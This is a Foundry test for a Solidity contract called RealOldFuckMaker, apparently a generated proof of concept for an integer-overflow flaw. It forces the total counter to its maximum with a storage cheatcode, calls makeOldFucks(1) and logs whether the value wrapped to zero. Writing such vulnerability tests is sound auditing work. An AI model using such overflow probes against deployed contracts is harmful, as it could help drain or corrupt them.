// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xf2570186500a46986f3139f65afedc2afe4f445d.sol";

contract RealOldFuckMakerTest is Test {
    RealOldFuckMaker public fuckMaker;
    address private user = address(0x123);

    function setUp() public {
        // Deploy RealOldFuckMaker contract
        fuckMaker = new RealOldFuckMaker();
    }

    function testMakeOldFucksOverflow() public {
        // Setup for overflow vulnerability
        vm.startPrank(user);
        bytes32 targetSlot = bytes32(uint256(0));
        
        // BEFORE: Capture initial state
        console.log("--- BEFORE-Trigger Stats ---");
        uint256 initTotalFucks;
        assembly {
            initTotalFucks := sload(targetSlot)
        }
        (uint256 initUserFucks, ) = fuckMaker.getUserStats(user);
        console.log("Initial totalFucksMade:", initTotalFucks);
        console.log("User initial fucksMade:", initUserFucks);

        // Set total to max for overflow
        vm.store(address(fuckMaker), targetSlot, bytes32(type(uint256).max));

        // Trigger overflow attack
        console.log("--- Trigger Overflow ---");
        fuckMaker.makeOldFucks(1);
        console.log("Executed: makeOldFucks(1)");

        // AFTER: Capture post-attack state
        console.log("--- AFTER-Trigger Stats ---");
        uint256 newTotalFucks;
        assembly {
            newTotalFucks := sload(targetSlot)
        }
        (uint256 newUserFucks, ) = fuckMaker.getUserStats(user);
        console.log("Post-attack totalFucksMade:", newTotalFucks);
        console.log("User post-attack fucksMade:", newUserFucks);
        
        // Validate state changes
        bool overflowOccurred = newTotalFucks == 0 && initTotalFucks < type(uint256).max;
        bool userIncrementValid = newUserFucks == initUserFucks + 1;
        
        // Final vulnerability verdict
        if (overflowOccurred && userIncrementValid) {
            console.log("Vulnerability Exists: totalFucksMade overflowed (max->0) and userFucksMade incremented");
        } else {
            console.log("Vulnerability not Exist: No overflow detected in state changes");
        }
    }
}